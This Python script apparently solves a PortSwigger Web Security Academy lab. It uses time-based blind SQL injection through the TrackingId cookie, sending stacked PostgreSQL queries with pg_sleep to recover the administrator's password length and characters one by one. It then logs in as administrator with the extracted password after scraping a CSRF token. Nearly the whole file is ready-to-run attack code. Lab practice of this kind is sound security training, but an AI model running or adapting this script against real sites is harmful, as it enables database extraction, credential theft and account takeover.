import requests
import time
import urllib.parse
from string import ascii_lowercase, digits
import bs4


GLOBAL_DOMAIN = "0adf008304d370cf813d072c00270002.web-security-academy.net"
url = f"https://{GLOBAL_DOMAIN}/"

headers = {
    "Host": GLOBAL_DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://portswigger.net/",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site"
}

cookies = {
    "TrackingId": "r46hZ528lAYVoFNX",
    "session": "JNkBUHK3INHG0MBXVuYwCDIE1RV5Y4qT"
}

def execute_query(query):
    query = urllib.parse.quote(query)
    cookies["TrackingId"] = query
    response = requests.get(url, headers=headers, cookies=cookies)
    return response.elapsed.total_seconds()

def find_password_length():
    for i in range(10, 50):
        query = f"'; SELECT CASE WHEN (username='administrator' AND LENGTH(password) = {i}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
        response_time = execute_query(query)
        if execute_query(query) > 5:
            print('Password length: ', i)
            return i

def find_password():
    password_length = 20 # find_password_length()
    password = ''
    for i in range(1, password_length + 1):
        for c in ascii_lowercase + digits:
            query = f"'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i}, 1) = '{c}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--"
            response_time = execute_query(query)
            if response_time > 2:
                password += c
                print('Password: ', password)
                break
        time.sleep(1)

# test_query("'; (SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END) --")
# test_query("x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--")
        
# find_password() # m1412die2ismq32zhgmc


def get_csrf_token(url, headers, cookies):
    response = requests.get(url, headers=headers, cookies=cookies)
    soup = bs4.BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def get_session_cookies(url, headers, cookies):
    response = requests.get(url, headers=headers, cookies=cookies)
    return response.cookies.get_dict()["session"]

def login():
    url = f"https://{GLOBAL_DOMAIN}/login"
    headers = {
        "Host": GLOBAL_DOMAIN,
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"https://{GLOBAL_DOMAIN}",
        "Connection": "keep-alive",
        "Referer": f"https://{GLOBAL_DOMAIN}/login",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "TE": "trailers"
    }

    cookies = {
        "TrackingId": "r46hZ528lAYVoFNX",
        "session": "Ik6JrwBc6MdDLaX13PRoMmJ5DPM0Zizd"
    }

    data = {
        "csrf": "OsJtXIO03gpAEwWPdzSXlwk8W9pLO9h7",
        "username": "administrator",
        "password": "m1412die2ismq32zhgmc" # find_password()
    }

    cookies["session"] = get_session_cookies(url, headers, cookies)
    data["csrf"] = get_csrf_token(url, headers, cookies)

    response = requests.post(url, headers=headers, cookies=cookies, data=data)

    if 'Your username is' in response.text:
        print('Successfully logged in!')
    else:
        print('Login failed!')

login()